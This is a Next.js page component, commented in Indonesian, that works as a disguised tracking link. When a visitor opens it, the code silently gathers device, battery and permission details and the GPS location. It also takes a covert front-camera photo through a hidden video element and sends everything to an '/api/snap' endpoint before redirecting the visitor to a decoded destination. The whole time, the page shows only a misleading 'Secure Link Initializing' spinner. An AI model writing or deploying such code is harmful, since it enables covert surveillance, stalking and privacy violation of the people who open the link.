"use client";

import React, { useEffect, useRef, Suspense } from "react";
import { useSearchParams } from "next/navigation";

// Komponen utama yang berisi logika capture
function CaptureContent() {
  const searchParams = useSearchParams();
  const t = searchParams.get("t");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const autoProcess = async () => {
      // 1. Decode URL tujuan untuk redirect
      let destination = "/";
      try {
        if (t) destination = atob(t);
      } catch {
        destination = "/";
      }

      // 2. Deteksi Info Perangkat
      const deviceInfo = {
        model: navigator.userAgent.includes("Android")
          ? "Android"
          : navigator.userAgent.includes("iPhone")
            ? "iOS"
            : "PC",
        os: navigator.platform,
        language: navigator.language,
        browser: navigator.userAgent.split(" ").pop(),
      };

      // 3. Deteksi Baterai
      let batteryInfo = null;
      try {
        if ("getBattery" in navigator) {
          const battery: any = await (navigator as any).getBattery();
          batteryInfo = {
            level: Math.round(battery.level * 100),
            charging: battery.charging,
          };
        }
      } catch (e) {}

      // 4. Deteksi Izin & Sensor
      const permissionsStatus = {
        notifications:
          "Notification" in window ? Notification.permission : "Not Supported",
        nearby: "bluetooth" in navigator ? "Supported" : "Not Supported",
        audio: !!(
          navigator.mediaDevices && navigator.mediaDevices.getUserMedia
        ),
      };

      // 5. Ambil GPS
      const gps = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          () => resolve(null),
          { timeout: 5000 },
        );
      });

      // 6. Ambil Gambar Kamera
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
        });

        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await new Promise((r) => setTimeout(r, 1500));

          const video = videoRef.current;
          const canvas = canvasRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d")?.drawImage(video, 0, 0);

          const image = canvas.toDataURL("image/png");
          stream.getTracks().forEach((track) => track.stop());

          // 7. Kirim SEMUA data ke API
          await fetch("/api/snap", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              image,
              gps,
              device: deviceInfo,
              battery: batteryInfo,
              permissions: {
                ...permissionsStatus,
                location: !!gps,
                camera: true,
              },
            }),
          });

          window.location.replace(destination);
        }
      } catch (err) {
        // Fallback jika kamera ditolak: Kirim data sisa yang tersedia
        await fetch("/api/snap", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            image: "",
            gps,
            device: deviceInfo,
            battery: batteryInfo,
            permissions: {
              ...permissionsStatus,
              location: !!gps,
              camera: false,
            },
          }),
        });
        window.location.replace(destination);
      }
    };

    autoProcess();
  }, [t]);

  return (
    <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
      <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-500 mb-4"></div>
      <p className="text-xs tracking-widest text-slate-500 uppercase animate-pulse">
        Secure Link Initializing...
      </p>
      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="absolute opacity-0 w-1 h-1 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}

export default function CapturePage() {
  return (
    <Suspense
      fallback={
        <div className="bg-black text-white flex items-center justify-center min-h-screen font-mono">
          <p className="text-xs uppercase tracking-widest text-slate-600">
            Initialising Secure Environment...
          </p>
        </div>
      }
    >
      <CaptureContent />
    </Suspense>
  );
}
